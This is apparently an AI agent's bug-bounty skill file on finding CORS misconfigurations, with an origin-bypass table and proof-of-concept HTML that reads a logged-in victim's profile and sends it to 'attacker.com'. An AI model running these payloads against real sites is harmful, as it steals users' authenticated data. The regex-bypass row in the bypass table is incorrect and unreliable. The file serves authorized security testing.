---
name: hunt-cors
description: CORS misconfiguration — origin reflection with credentials, null origin, subdomain takeover trust, preflight bypass.
keywords: [cors, access-control-allow-origin, credentials, null origin, preflight, withcredentials]
---

# hunt-cors

## Triggers

"cors", "access-control", "allow-origin", "withCredentials".

## Phase 1 — capture the policy

Request:
```
GET /api/profile HTTP/1.1
Host: app.example.com
Origin: https://attacker.com
```

Look at response:

| `Access-Control-Allow-Origin` value | `Allow-Credentials` | Verdict |
|---|---|---|
| `*` | (any — credentials are blocked anyway) | Safe for unauthenticated APIs |
| `*` | `true` | Browser blocks the combination — not exploitable (browser fails request) |
| `https://attacker.com` (reflected) | `true` | **Exploitable** — origin reflection |
| `null` | `true` | **Exploitable** — sandboxed iframe / data: URL has null origin |
| Specific list | `true` | Check the list for subdomain takeover candidates |

## Phase 2 — bypass matrix

| Filter | Bypass |
|---|---|
| Allows `*.example.com` | Subdomain takeover → set up `evil.example.com` |
| Allows `https://app.example.com` literal | `https://app.example.com.attacker.com` (suffix match) |
| Allows `https://example.com` | `https://example.com.attacker.com`, `https://attackerexample.com` |
| Regex `^https://[a-z0-9-]+\.example\.com$` | `https://app.example.com:80@attacker.com` |
| Reflects with prefix check | Encode origin to bypass |

## Phase 3 — PoC

```html
<script>
fetch('https://app.example.com/api/profile', {credentials: 'include'})
  .then(r => r.text())
  .then(t => fetch('https://attacker.com/log?d=' + btoa(t)))
</script>
```

Host on `https://attacker.com`. Visit while logged in to victim app.
If attacker's log receives data → CORS misconfig confirmed,
auth context leak.

## Phase 4 — `null` origin

When sandboxed iframe or `data:` URL is the attacker page:

```html
<iframe sandbox="allow-scripts" srcdoc="
<script>fetch('https://app.example.com/api/profile',{credentials:'include'})
  .then(r=>r.text()).then(t=>parent.postMessage(t,'*'))</script>"></iframe>
```

If server allows `Origin: null` with credentials → ATO-grade leak.

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #235200 | Reflected ACAO with credentials → API leak |
| H1 #1063636 | null origin + credentials |
| CVE-2024-3094 (xz) — not CORS but illustrates supply-chain | |

## Never-submit fallbacks

- ACAO `*` without credentials → KILL (intended for public API)
- Misconfig on an unauthenticated endpoint → KILL
- Allow-list includes `localhost` only → KILL (dev-only impact)

## See also

- `hunt-xss`, `hunt-csrf`, `hunt-redirect` (open redirect on
  `*.example.com` may give back ACAO trust)
